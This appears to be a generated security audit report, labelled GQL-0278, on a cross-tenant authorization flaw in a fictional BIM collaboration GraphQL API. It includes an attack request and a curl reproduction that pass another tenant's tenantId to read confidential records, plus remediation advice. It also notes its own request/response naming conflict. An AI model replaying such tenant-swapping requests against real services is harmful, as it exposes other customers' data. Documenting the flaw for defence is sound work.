# Security Analysis Report
**System:** BuildCore BIM Collaboration
**Domain:** Construction / BIM
**Example ID:** GQL-0278
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Integrity — Pattern 4.2 | Persistence poisoning via lifecycle actions on `listResources` / `getResource` — attacker can read and potentially modify BIM collaboration records |

---

## Finding 1 — Integrity: Persistence Poisoning via Lifecycle Actions (Pattern 4.2)

### Summary
The GraphQL API at `https://api.buildcore-bim-collab.example.com/graphql` exposes a `listResources` resolver vulnerable to persistence poisoning — by supplying a client-controlled `tenantId`, an attacker gains read access to BIM collaboration records of another tenant, potentially enabling downstream poisoning of persisted lifecycle state. The resolver does not verify the JWT `tenantId` claim.

**Context.txt inconsistency (documented):** The HAR request uses `listResources(tenantId: "tenant-a06a")`, while the HAR response returns data under the key `getResource`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-c0c5a06a` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 4.2 — Persistence poisoning via lifecycle actions (Integrity)
**Affected endpoint:** `POST https://api.buildcore-bim-collab.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.buildcore-bim-collab.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { listResources(tenantId: \"tenant-a06a\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Victim BIM Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-a06a",
      "ownerId": "other-user-c0c5a06a",
      "data": {
        "sensitiveField": "CONFIDENTIAL-c0c5a06a",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.buildcore-bim-collab.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listResources(tenantId: \"tenant-a06a\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-a06a, sensitiveField: CONFIDENTIAL-c0c5a06a
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must inject `tenantId` from JWT — never accept it as a client argument.
2. Lifecycle mutations (create/update/archive) must validate ownership before persisting state changes.
3. Redis cache key must include tenant dimension.
